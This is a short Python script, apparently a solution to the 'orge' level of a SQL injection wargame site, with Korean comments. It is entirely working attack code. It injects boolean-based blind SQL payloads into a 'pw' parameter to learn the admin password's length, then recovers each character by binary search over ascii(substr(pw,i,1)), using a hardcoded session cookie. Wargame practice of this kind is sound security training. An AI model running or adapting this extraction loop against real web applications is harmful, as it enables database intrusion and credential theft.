import requests

host = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
cookies = { 'PHPSESSID' : 'cr78tr7for2pr1nuh52j3t48b9' }
pw_length = 0

while True:
	pw_length += 1
	#&&는 url 인코딩 된 값으로 인식될 수 있으므로 %26%26으로 씀
	query = f"' || id='admin' %26%26 length(pw)={pw_length}-- -"
	url = f"{host}/?pw={query}"
	
	r = requests.get(url, cookies = cookies)
	
	if "Hello admin" in r.text:
		print(f"비밀번호 길이 : {pw_length}")
		break
	
password = ''
	
for i in range(1, pw_length + 1):
	high = 127
	low = 32
	found_char = ''
		
	while low <= high:
		mid = (low+high)//2
		payload = f"' || id='admin' %26%26 ascii(substr(pw, {i}, 1)) > {mid}-- -"
		url = f"{host}/?pw={payload}"
			
		r = requests.get(url, cookies = cookies)
			
		if "Hello admin" in r.text:
			low = mid + 1
		else:
			high = mid - 1
			found_char = chr(mid)
				
	password += found_char
	print(f"{i}번째 비밀번호 문자 : {password}")
		
print(f"최종 비밀번호: {password}")